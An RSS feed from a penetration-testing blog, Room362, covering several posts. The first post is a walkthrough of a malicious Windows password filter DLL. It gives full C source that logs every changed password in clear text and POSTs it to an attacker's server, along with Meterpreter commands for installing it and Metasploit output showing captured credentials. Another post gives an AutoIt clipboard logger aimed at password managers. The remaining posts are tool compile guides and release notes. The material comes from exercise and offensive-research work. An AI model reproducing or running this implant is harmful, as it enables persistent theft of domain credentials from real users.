<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Releases on Room362</title>
    <link>//room362.com/categories/releases/</link>
    <description>Recent content in Releases on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Wed, 11 Sep 2013 00:28:31 -0500</lastBuildDate>
    <atom:link href="//room362.com/categories/releases/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Stealing passwords every time they change</title>
      <link>//room362.com/post/2013/2013-09-11-stealing-passwords-every-time-they-change/</link>
      <pubDate>Wed, 11 Sep 2013 00:28:31 -0500</pubDate>
      
      <guid>//room362.com/post/2013/2013-09-11-stealing-passwords-every-time-they-change/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85&#34;&gt;Password Filters [0]&lt;/a&gt;.aspx&amp;rdquo;) are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy.  It is also fairly documented on how to Install and &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85&#34;&gt;Register Password Filters [1]&lt;/a&gt;.aspx). Basically what it boils down to is updating a registry key here: &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;with the name of a DLL (without the extension) that you place in Windows\System32&lt;/p&gt;

&lt;p&gt;For &lt;a href=&#34;http://www.nationalccdc.org/&#34;&gt;National CCDC&lt;/a&gt; earlier this year (2013), I created an installer and &amp;ldquo;evil pass filter&amp;rdquo; that basically installed itself as a password filter and any time any passwords changed it would store the change to a log file locally to the victim (in clear text) as well as issue an HTTP basic auth POST to a server I own with the username and password.&lt;/p&gt;

&lt;p&gt;The full code can be found below. I&amp;rsquo;ll leave the compiling up to you but basically its slamming the code in Visual Studio, telling it its a DLL, and clicking build for the architecture you are targeting (Make sure to use the Internet Open access settings that make the most sense for the environment you are using this in [&lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85&#34;&gt;2&lt;/a&gt;.aspx)].&lt;/p&gt;

&lt;p&gt;So lets walk the exploitation:&lt;/p&gt;

&lt;p&gt;First, you have to be admin or system, as this is more of a persistence method than anything.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getuid
Server username: NT AUTHORITY\SYSTEM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, we upload the evilpassfilter.dll to Sytem32:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; pwd
C:\Windows\system32
meterpreter &amp;gt; upload /tmp/evilpassfilter.dll .
[*] uploading  : /tmp/evilpassfilter.dll -&amp;gt; .
[*] uploaded   : /tmp/evilpassfilter.dll -&amp;gt; .\evilpassfilter.dll
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we need to query what is already in the notification packages list:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; reg queryval -k HKLM\\System\\CurrentControlSet\\Control\\Lsa -v &amp;quot;Notification Packages&amp;quot;
Key: HKLM\System\CurrentcontrolSet\Control\Lsa
Name: Notification Packages
Type:
Data: sceclirassfm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What you can&amp;rsquo;t see here since Metasploit isn&amp;rsquo;t showing the line breaks is that there are two there by default:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;scecli
rassfm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We need to add ours to the end of this list, unfortunately at the current point of time its impossible to do directly from the meterpreter command line (as far as I know). So we need to drop a .reg file and manually import it. Easiest way to do that is to add your &amp;ldquo;evilpassfilter&amp;rdquo; string as well as the ones on the victim to a VM you have and export it. Should look like this:&lt;/p&gt;

&lt;p&gt;Once we have our file, we upload and import it using reg command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; upload importme.reg .
[*] uploading  : importme.reg -&amp;gt; .
[*] uploaded   : importme.reg -&amp;gt; .\importme.reg
meterpreter &amp;gt; execute -H -f regedit.exe -a &#39;/s importme.reg&#39;
Process 2628 created.
meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Double check our work:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; reg queryval -k HKLM\\System\\CurrentcontrolSet\\Control\\Lsa -v &amp;quot;Notification Packages&amp;quot;
Key: HKLM\System\CurrentcontrolSet\Control\Lsa
Name: Notification Packages
Type:
Data: sceclirnrassfmrnevilpassfilter 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Its there, w00t! But it doesn&amp;rsquo;t do anything until a reboot happens :(. Lets just force that to happen (not the most stealthy thing to do):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; reboot
Rebooting...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While thats going on, lets set up the server to catch the basic auth.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf exploit(psexec) &amp;gt; use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) &amp;gt; set URIPATH /
URIPATH =&amp;gt; /
msf auxiliary(http_basic) &amp;gt; run
[*] Auxiliary module execution completed
msf auxiliary(http_basic) &amp;gt;
[*] Listening on 0.0.0.0:80...
[*] Using URL: http://0.0.0.0:80/
[*]  Local IP: http://192.168.92.106:80/
[*] Server started.
msf auxiliary(http_basic) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we wait for a password to be changed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(http_basic) &amp;gt;
[*] 192.168.92.106   http_basic - Sending 401 to client
[+] 192.168.92.106 - Credential collected: &amp;quot;jack:ASDqwe123&amp;quot; =&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No matter how complex their password is and without having a shell on the box anymore:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf auxiliary(http_basic) &amp;gt;
[+] 192.168.92.106 - Credential collected: &amp;quot;jack:a?&#39;z_a4#RRK(mvQEsyQ8l`,JR.pes&amp;lt;;6#0$puQ%Q&amp;amp;,@ZwY(T@p&amp;quot; =&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This works from Windows 2000, XP all the way up to Windows 8 &amp;amp; 2012.&lt;/p&gt;

&lt;p&gt;Ok, but how often are local password changed? Maybe not that often, but guess what happens when a password filter is put on a domain controller. Every password changed by that DC is &amp;ldquo;verified&amp;rdquo; by your evil password filter.&lt;/p&gt;

&lt;p&gt;Oh and what does that log file we talked about earlier on the victim look like if for some reason they block that IP you&amp;rsquo;re getting your authentication to? (You would have to find a way to get back on that system, or make it available via a share or otherwise)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;InitializeChangeNotify()
JackJohnson:ASDqwe123
JackJohnson:a?&#39;z_a4#RRK(mvQEsyQ8l`,JR.pes&amp;lt;;6#0$puQ%Q&amp;amp;,@ZwY(T@p
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This attack supports a larger character set than most banks ;-)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;[0] &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85&#34;&gt;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721882(v=vs.85).aspx&lt;/a&gt;.aspx&amp;rdquo;)&lt;/li&gt;
&lt;li&gt;[1] &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85&#34;&gt;http://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx&lt;/a&gt;.aspx&amp;rdquo;)&lt;/li&gt;
&lt;li&gt;[2] &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85&#34;&gt;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx&lt;/a&gt;.aspx&amp;rdquo;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Full code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;WinInet.h&amp;gt;
#include &amp;lt;ntsecapi.h&amp;gt;

void writeToLog(const char* szString)
{
    FILE* pFile = fopen(&amp;quot;c:\\windows\\temp\\logFile.txt&amp;quot;, &amp;quot;a+&amp;quot;);
    if (NULL == pFile)
    {
        return;
    }
    fprintf(pFile, &amp;quot;%s\r\n&amp;quot;, szString);
    fclose(pFile);
    return;
}



// Default DllMain implementation
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
                     )
{
    OutputDebugString(L&amp;quot;DllMain&amp;quot;);
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

BOOLEAN __stdcall InitializeChangeNotify(void)
{
    OutputDebugString(L&amp;quot;InitializeChangeNotify&amp;quot;);
    writeToLog(&amp;quot;InitializeChangeNotify()&amp;quot;);
    return TRUE;
}

BOOLEAN __stdcall PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation )
{
    OutputDebugString(L&amp;quot;PasswordFilter&amp;quot;);
    return TRUE;
}

NTSTATUS __stdcall PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG RelativeId,
    PUNICODE_STRING NewPassword )
{
  FILE* pFile = fopen(&amp;quot;c:\\windows\\temp\\logFile.txt&amp;quot;, &amp;quot;a+&amp;quot;);
  //HINTERNET hInternet = InternetOpen(L&amp;quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&amp;quot;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
    HINTERNET hInternet = InternetOpen(L&amp;quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&amp;quot;,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
    HINTERNET hSession = InternetConnect(hInternet,L&amp;quot;172.16.10.1&amp;quot;,80,NULL,NULL,INTERNET_SERVICE_HTTP ,0,0);
    HINTERNET hReq = HttpOpenRequest(hSession,L&amp;quot;POST&amp;quot;,L&amp;quot;/&amp;quot;,NULL,NULL,NULL,0,0);
    char* pBuf=&amp;quot;SomeData&amp;quot;;



    OutputDebugString(L&amp;quot;PasswordChangeNotify&amp;quot;);
    if (NULL == pFile)
    {
        return;
    }
    fprintf(pFile, &amp;quot;%ws:%ws\r\n&amp;quot;, UserName-&amp;gt;Buffer,NewPassword-&amp;gt;Buffer);
  fclose(pFile);
    InternetSetOption(hSession,INTERNET_OPTION_USERNAME,UserName-&amp;gt;Buffer,UserName-&amp;gt;Length/2);
    InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,NewPassword-&amp;gt;Buffer,NewPassword-&amp;gt;Length/2);
    HttpSendRequest(hReq,NULL,0,pBuf,strlen(pBuf));

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Compiling and Release of Ditto</title>
      <link>//room362.com/post/2012/2012-10-08-compiling-and-release-of-ditto/</link>
      <pubDate>Mon, 08 Oct 2012 04:36:00 +0000</pubDate>
      
      <guid>//room362.com/post/2012/2012-10-08-compiling-and-release-of-ditto/</guid>
      <description>&lt;p&gt;If you follow the exact same steps you did for Netview: &lt;a href=&#34;//room362.com/blog/2012/10/07/compiling-and-release-of-netview/&#34;&gt;/blog/2012/10/07/compiling-and-release-of-netview/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;then you already have the steps needed to create a compiled version of ditto from the repo here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/ditto&#34;&gt;https://github.com/mubix/ditto&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And while the sheep icon is cute, and a nod to what ditto does, it comes at a pretty hefty cost:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_ditto_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Size. Now if you&amp;rsquo;re scoffing at 408 KB then you don&amp;rsquo;t have any issues, but I like not having to wait while a binary I am trying to push to a victim box is transferring. Removing the icon is pretty straight forward. Once you&amp;rsquo;ve loaded the .SLN file up in Visual Studio C++ just expand the &amp;ldquo;Resource Files&amp;rdquo; folder in the &amp;ldquo;Solution Explorer&amp;rdquo;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_ditto_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And summarily delete both files (Right click and go to Remove or just press the Del button)&lt;/p&gt;

&lt;p&gt;(Side note, don&amp;rsquo;t forget to rename or copy the one with the icon somewhere first if you want to keep that version)&lt;/p&gt;

&lt;p&gt;Then &amp;ldquo;Build Solution&amp;rdquo; again, and wa-la! A much smaller, less witty but highly functional Ditto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_ditto_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And of course, like last time, you could go through all that, or just download them here:&lt;/p&gt;

&lt;p&gt;Without the icon: &lt;a href=&#34;//room362.com/projects/ditto_noicon.exe&#34;&gt;/projects/ditto_noicon.exe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;With the icon: &lt;a href=&#34;//room362.com/projects/ditto_withicon.exe&#34;&gt;/projects/ditto_withicon.exe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Compiling and Release of Netview</title>
      <link>//room362.com/post/2012/2012-10-07-compiling-and-release-of-netview/</link>
      <pubDate>Sun, 07 Oct 2012 04:10:51 +0000</pubDate>
      
      <guid>//room362.com/post/2012/2012-10-07-compiling-and-release-of-netview/</guid>
      <description>&lt;p&gt;If you haven&amp;rsquo;t caught &lt;a href=&#34;http://carnal0wnage.attackresearch.com/&#34;&gt;Chris Gates&lt;/a&gt; (&lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;@carnal0wnage&lt;/a&gt;) and my &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon2/1-1-6-rob-fuller-chris-gates-dirty-little-secrets-part-2&#34;&gt;talk&lt;/a&gt; at &lt;a href=&#34;http://www.derbycon.com/&#34;&gt;DerbyCon 2012&lt;/a&gt; - we released 2 tools, &lt;a href=&#34;https://github.com/mubix/netview&#34;&gt;Netview&lt;/a&gt;, and &lt;a href=&#34;https://github.com/mubix/ditto&#34;&gt;Ditto&lt;/a&gt;. Here I&amp;rsquo;ll walk you through compiling Netview yourself, in the next blog post we&amp;rsquo;ll go over compiling Ditto and how you can remove it&amp;rsquo;s icon to reduce the size if you want. But for Netview it&amp;rsquo;s pretty straight forward. First you pull a copy of the GIT repository:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/netview&#34;&gt;https://github.com/mubix/netview&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once you&amp;rsquo;ve done that, you&amp;rsquo;ve got a directory looking like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_netview_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;You will also need Visual Studio C++ (The Express version if free here: &lt;a href=&#34;http://www.microsoft.com/visualstudio/eng/downloads#d-2010-express&#34;&gt;http://www.microsoft.com/visualstudio/eng/downloads#d-2010-express&lt;/a&gt; )&lt;/p&gt;

&lt;p&gt;Once you have both you double click the .sln file (Solution File)&lt;/p&gt;

&lt;p&gt;And you get a ugly blue and purple box like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_netview_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Where you switch the compile option from &amp;ldquo;Debug&amp;rdquo; to &amp;ldquo;Release&amp;rdquo; and click to &amp;ldquo;Build Solution&amp;rdquo;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_netview_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Sounds much more grandiose than it really is. If all goes well you&amp;rsquo;ll get the box at the bottom to say &amp;ldquo;Build: 1 succeeded&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_netview_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;You&amp;rsquo;ll have a new folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_netview_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;and inside is your wonderful prize:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;//room362.com/images/postimages/201210_netview_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;You could go through all of that… or just download it here: &lt;a href=&#34;//room362.com/projects/netview.exe&#34;&gt;/projects/netview.exe&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hak5 Segment Sneak Peak</title>
      <link>//room362.com/post/2011/2011-12-26-hak5-segment-sneak-peak/</link>
      <pubDate>Mon, 26 Dec 2011 06:06:20 +0000</pubDate>
      
      <guid>//room362.com/post/2011/2011-12-26-hak5-segment-sneak-peak/</guid>
      <description>&lt;p&gt;Since it&amp;rsquo;s Christmas and all, I thought I&amp;rsquo;d post the code snippet from my Hak5 segment a bit early:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;Clipboard.au3&amp;gt;
#include &amp;lt;File.au3&amp;gt;
$oldclip = &amp;quot;&amp;quot;
While 1
    $clip = _ClipBoard_GetData()
    If $clip &amp;lt;&amp;gt; &amp;quot;0&amp;quot; Then
        If $clip &amp;lt;&amp;gt; $oldclip Then
            _FileWriteLog(@UserProfileDir &amp;amp; &amp;quot;clip.log&amp;quot;, $clip)
            $oldclip = $clip
        EndIf
    EndIf
    Sleep(100)
WEnd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It&amp;rsquo;s pretty straight forward, and I welcome everyone to install AutoIt3 and compile/run the above script to see what it does (although most of you I&amp;rsquo;m sure can figure it out just by reading it).&lt;/p&gt;

&lt;p&gt;(Think KeePass, 1Password, LastPass&amp;hellip;)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Burp Suite v1.2 Released</title>
      <link>//room362.com/post/2008/2008-12-15-burp-suite-v12-released/</link>
      <pubDate>Mon, 15 Dec 2008 04:39:09 +0000</pubDate>
      
      <guid>//room362.com/post/2008/2008-12-15-burp-suite-v12-released/</guid>
      <description>&lt;p&gt;It’s official Burp Suite 1.2 is officially released to the masses. It includes a whole host of new features. Mainly (the ones spoke of in the &lt;a href=&#34;http://blog.portswigger.net/2008/12/burp-suite-v12-released.html&#34;&gt;blog post about the release&lt;/a&gt;):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Site map showing information accumulated about target applications in tree and table form&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Suite-level target scope configuration, driving numerous individual tool actions&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Display filters on site map and Proxy request history&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Suite-wide search function&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Support for invisible proxying&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Fully fledged web vulerability scanning (&lt;a href=&#34;http://www.portswigger.net/suite/download.html&#34;&gt;pro version only&lt;/a&gt;)&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Ability to save and restore state (&lt;a href=&#34;http://www.portswigger.net/suite/download.html&#34;&gt;pro version only&lt;/a&gt;)&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can download the new version at &lt;a href=&#34;http://www.portswigger.net/suite/download.html&#34;&gt;http://www.portswigger.net/suite/download.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Ask and you shall receive - SumoLinux</title>
      <link>//room362.com/post/2008/2008-12-10-ask-and-you-shall-receive-sumolinux/</link>
      <pubDate>Wed, 10 Dec 2008 21:35:48 +0000</pubDate>
      
      <guid>//room362.com/post/2008/2008-12-10-ask-and-you-shall-receive-sumolinux/</guid>
      <description>&lt;p&gt;If you haven’t seen it yet, I posted about a &lt;a href=&#34;//room362.com/archives/218-Multi-Boot-Security-LiveCD-DVD.html&#34;&gt;Nerv-Labs Live DVD&lt;/a&gt; that included all kinds security distros in one bootable DVD. Which was also featured in &lt;a href=&#34;http://www.hak5.org/episodes/episode-415&#34;&gt;Episode 0x415&lt;/a&gt; of &lt;a href=&#34;http://www.hak5.org/&#34;&gt;Hak5&lt;/a&gt;. Well, there were some things that it was kinda lacking, mainly Helix and Samurai.&lt;/p&gt;

&lt;p&gt;Well, my buddy &lt;a href=&#34;http://weblog.suntzudata.com/&#34;&gt;Marcus Carey&lt;/a&gt; from &lt;a href=&#34;http://www.suntzudata.com&#34;&gt;SunTzu Data&lt;/a&gt; did it up right. Let me introduce &lt;a href=&#34;http://sumolinux.suntzudata.com/&#34;&gt;SumoLinux&lt;/a&gt;. SumoLinux has the following linux distributions on it:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.remote-exploit.org/backtrack_download.html&#34;&gt;Backtrack 3&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.e-fense.com/helix/&#34;&gt;Helix 2.0&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://samurai.inguardians.com/&#34;&gt;Samurai Linux&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.dban.org/&#34;&gt;DBAN&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.damnvulnerablelinux.org/index.php/eng/Damn%20Vulnerable%20Linux%20Distro&#34;&gt;DVL&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;DOWNLOAD IT HERE&lt;/strong&gt;: &lt;a href=&#34;http://thepiratebay.org/torrent/4527605/SUMO_Linux&#34;&gt;http://thepiratebay.org/torrent/4527605/SUMO_Linux&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You probably know what Backtrack 3 is, it’s the distro that is produced by the guys at &lt;a href=&#34;http://www.offensive-security.com/&#34;&gt;Offensive Security&lt;/a&gt;. Helix 2.0 is the forensics distro, and Samurai is the awesome web application attack/assessment distro put out by &lt;a href=&#34;http://inguardians.com/&#34;&gt;InGuardians&lt;/a&gt;. But the last two you may not have heard of. DBAN (Darik’s Boot and Nuke) is a disk wiping boot cd that has templates for DoD, Gutmann, and PCMP wiping standards. And last but not least is DVL (Damn Vulnerable Linux) which is a distro where you can learn security, starting from basic netcat listening to exploit development.&lt;/p&gt;

&lt;p&gt;Thanks go to Marcus for making our dreams come true, now if I could just get another USB stick to put this on. &lt;a href=&#34;http://lubi.sourceforge.net/unetbootin.html&#34;&gt;Unetbootin&lt;/a&gt; here I come!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Maltego 2.01 Released</title>
      <link>//room362.com/post/2008/2008-12-06-maltego-201-released/</link>
      <pubDate>Sat, 06 Dec 2008 02:03:00 +0000</pubDate>
      
      <guid>//room362.com/post/2008/2008-12-06-maltego-201-released/</guid>
      <description>&lt;p&gt;This is just a quick blurb because &lt;a href=&#34;http://spylogic.net&#34;&gt;Tom&lt;/a&gt; from the &lt;a href=&#34;http://securityjustice.com/&#34;&gt;Security Justice Podcast&lt;/a&gt; already has a great post about all the changes:&lt;/p&gt;

&lt;p&gt;Check out his post here: &lt;a href=&#34;http://spylogic.net/item/382&#34;&gt;http://spylogic.net/item/382&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;New link: &lt;a href=&#34;http://www.spylogic.net/2008/12/maltego-201-released/&#34;&gt;http://www.spylogic.net/2008/12/maltego-201-released/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>